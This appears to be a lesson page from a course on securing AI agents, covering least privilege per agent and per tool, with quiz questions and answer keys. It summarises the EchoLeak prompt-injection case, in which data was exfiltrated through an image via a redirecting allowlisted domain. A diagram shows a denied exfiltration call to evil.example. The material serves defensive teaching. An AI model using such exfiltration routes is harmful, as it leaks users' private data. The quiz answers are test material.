---
id: "06-03"
titre: "Least privilege"
sous_rubriques:
  - id: par-agent
    titre: "Per agent"
  - id: par-outil
    titre: "Per tool"
sources:
  - titre: "OWASP — Top 10 for LLM Applications 2025, LLM06 Excessive Agency"
    url: "https://genai.owasp.org/llmrisk/llm062025-excessive-agency/"
  - titre: "Simon Willison — Breaking down EchoLeak, June 11, 2025"
    url: "https://simonwillison.net/2025/Jun/11/echoleak/"
  - titre: "Simon Willison — The lethal trifecta for AI agents, June 16, 2025"
    url: "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/"
qcm:
  - id: par-agent-1
    sous_rubrique: par-agent
    question: "OWASP calls giving an agent too much power “Excessive Agency”. What are its three causes?"
    choix:
      - "Excessive functionality, excessive permissions, excessive autonomy"
      - "Too many tokens, too much latency, too much cost"
      - "Too many users, too many servers, too many logs"
      - "Too many models, too many languages, too many prompts"
    reponse: 0
    pourquoi: >-
      Functionality: tools the task doesn't need.
      Permissions: rights wider than necessary.
      Autonomy: serious actions without approval.
      Each one widens the damage of an injection.

  - id: par-agent-2
    sous_rubrique: par-agent
    question: "Which identity do you give an agent that accesses your systems?"
    choix:
      - "The personal token of the developer who wrote it"
      - "The admin account, to avoid getting blocked"
      - "Its own service identity, with its own rights, separate from the developers'"
      - "The account of the longest-standing user"
    reponse: 2
    pourquoi: >-
      An identity of its own can be limited precisely.
      It can be revoked without bothering anyone.
      In the logs, you know it was the agent that acted.
      A shared token mixes everything up.

  - id: par-agent-3
    sous_rubrique: par-agent
    question: "The agent acts on behalf of a user. Which rights should it have?"
    choix:
      - "The admin's"
      - "At most the user's, and only those the task needs"
      - "The sum of every user's rights"
      - "No check, it is the user asking"
    reponse: 1
    pourquoi: >-
      The agent must not become a way around the rights.
      If the user can't read a file, neither can the agent.
      And to summarize a ticket, it doesn't need to write.
      The intersection of both: the user's rights and the task's needs.

  - id: par-agent-4
    sous_rubrique: par-agent
    question: "Why prefer short-lived access tokens for an agent?"
    choix:
      - "Models prefer them"
      - "They are faster"
      - "They cost less"
      - "A stolen or misused token expires quickly"
    reponse: 3
    pourquoi: >-
      A token can leak into a log or an answer.
      If it expires in fifteen minutes, the window for abuse is short.
      A permanent token stays dangerous forever.

  - id: par-agent-5
    sous_rubrique: par-agent
    question: "A system has one agent that reads the web and one that accesses customer data. Should they have the same rights?"
    choix:
      - "Yes, otherwise they can't work together"
      - "Yes, it's simpler"
      - "No: each agent only has the rights of its role"
      - "It doesn't matter"
    reponse: 2
    pourquoi: >-
      The web agent reads untrusted content.
      If it also has customer data, a booby-trapped page can reach it.
      Separating the rights separates the risks.
      It is one way to break the lethal trifecta.

  - id: par-outil-1
    sous_rubrique: par-outil
    question: "The agent must look up orders. Which tool do you give it?"
    choix:
      - "read_order(id), read-only"
      - "run_sql(query)"
      - "full_db_access()"
      - "shell(command)"
    reponse: 0
    pourquoi: >-
      A precise tool does only one thing.
      run_sql can also wipe a table.
      shell can do anything.
      The tool's power is the attacker's power.

  - id: par-outil-2
    sous_rubrique: par-outil
    question: "A “fetch_page(url)” tool must read the internal documentation. How do you restrict it?"
    choix:
      - "No restriction"
      - "An instruction to the model: “stay on the internal docs”"
      - "An allowlist of permitted domains, checked in the tool's code"
      - "A shorter timeout"
    reponse: 2
    pourquoi: >-
      Without an allowlist, the tool can call any URL.
      An injection can slip private data into it.
      It is a way out.
      The allowlist closes that way out in code.

  - id: par-outil-3
    sous_rubrique: par-outil
    question: "In EchoLeak, the browser policy only allowed images from Microsoft domains. Why wasn't that enough?"
    choix:
      - "An allowed domain redirected to any address"
      - "The policy was turned off"
      - "The images were PDFs"
      - "Copilot ignored the browser"
    reponse: 0
    pourquoi: >-
      The allowlist held a domain that was too broad.
      That domain was willing to redirect elsewhere.
      The attacker went through it to reach their server.
      An allowlist is only as good as the most permissive domain it holds.

  - id: par-outil-4
    sous_rubrique: par-outil
    question: "Why split “read_file” and “write_file” into two tools?"
    choix:
      - "To slow the agent down"
      - "To have more tools"
      - "Because JSON requires it"
      - "You can grant one without the other, and require approval only for writing"
    reponse: 3
    pourquoi: >-
      Many tasks only read.
      A tool that reads and writes forces you to grant both.
      Split, you grant just what is needed.
      And human approval focuses on writing.

  - id: par-outil-5
    sous_rubrique: par-outil
    question: "An email-sending tool is needed. Which limit do you add in its code?"
    choix:
      - "None, email is harmless"
      - "Limited recipients (internal domain or a list), an hourly quota, approval for external ones"
      - "A 10-character limit"
      - "An instruction in the tool's description"
    reponse: 1
    pourquoi: >-
      Email is a way out.
      Limiting recipients stops it writing to the attacker.
      The quota limits the damage of a loop or an abuse.
      The model can ignore the description. Not the code.

  - id: par-outil-6
    sous_rubrique: par-outil
    question: "Should the tools exposed to the agent be the same for every task?"
    choix:
      - "It doesn't matter"
      - "Yes, always all of them"
      - "Yes, it's simpler for the model"
      - "No: only expose the tools useful for the current task"
    reponse: 3
    pourquoi: >-
      A missing tool can't be hijacked.
      A summary task doesn't need to send emails.
      Fewer tools also means less confusion for the model.
---

## Per agent {#par-agent}

**Least privilege**: each agent only has the rights its task needs.

OWASP calls the opposite “Excessive Agency”. Three excesses:

| Excess | Example |
|---|---|
| Functionality | A summary agent that can also send emails |
| Permissions | A token that writes when the agent only reads |
| Autonomy | A wire transfer without human approval |

:::pourquoi
An injection does what the agent can do.
The less it can, the less damage it does.
:::

Each agent has its **own identity**. Not a developer's account, not an admin account.

:::pourquoi
An identity of its own can be limited, revoked, traced.
A shared token mixes up responsibilities.
:::

When it acts for a user: at most **that user's rights**, cut down to **what the task needs**.

```mermaid
flowchart LR
  U["User's rights"] --> I{"Intersection"}
  T["Task's needs"] --> I
  I --> A["Agent's effective rights"]
```

:::pourquoi
The agent must not serve to get around the rights.
And the user doesn't need all their rights for this task.
:::

**Short-lived** tokens.

:::pourquoi
A leaked token that expires in fifteen minutes does little damage.
:::

In a multi-agent system, each role has its own rights.

:::pourquoi
The agent that reads the web must not have access to customer data.
Separating rights breaks the lethal trifecta.
:::

## Per tool {#par-outil}

Each tool is a door. You make it as narrow as possible.

| Rather than | Prefer |
|---|---|
| `run_sql(query)` | `read_order(id)` |
| `file(action, path)` | Separate `read_file(path)` and `write_file(path)` |
| `http(url)` | `fetch_doc(url)` with a domain allowlist |
| `send_email(to)` | Limited recipients, quota, approval for external ones |

:::pourquoi
A tool's power is the power of an attacker steering it.
A narrow tool is easy to validate and to monitor.
:::

Restrictions live in the **tool's code**, not in its description.

:::pourquoi
The model can ignore a description.
It can't get around an `if` in the code.
:::

Watch every **way out**: email, HTTP requests, images, links.

:::pourquoi
In EchoLeak, a mere image was the channel.
The image allowlist held a domain that redirected elsewhere.
An allowlist is worth what its most permissive domain is worth.
:::

Only expose the tools of the **current task**.

:::pourquoi
A missing tool can't be hijacked.
:::

```mermaid
sequenceDiagram
  participant L as Model
  participant O as Orchestrator
  participant P as Access policy
  participant T as Tool
  L->>O: fetch_doc(url=https://evil.example/?d=...)
  O->>P: This agent, this tool, this argument?
  P-->>O: Denied: domain not on the allowlist
  O-->>L: Denied: only internal domains are allowed
  Note over O,T: The call never reaches the tool
```

## Key points

- No excess functionality, permissions or autonomy.
- One identity per agent. Rights = the user's rights ∩ the task's needs.
- Short-lived tokens. Separate roles in multi-agent systems.
- Narrow tools, restrictions in code, ways out watched.
